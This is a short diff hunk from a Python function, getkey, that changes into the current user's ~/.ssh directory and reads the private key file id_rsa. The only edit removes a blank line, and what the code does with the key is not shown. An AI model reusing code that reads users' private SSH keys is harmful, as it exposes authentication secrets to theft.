@@ -28,7 +28,6 @@ def getkey():
     user = getpass.getuser()
     ssh_directory = f"/home/{user}/.ssh"
     os.chdir(ssh_directory)
-
     filename = "id_rsa"
     with open(filename, "rb") as thefile:
         key = thefile.read()
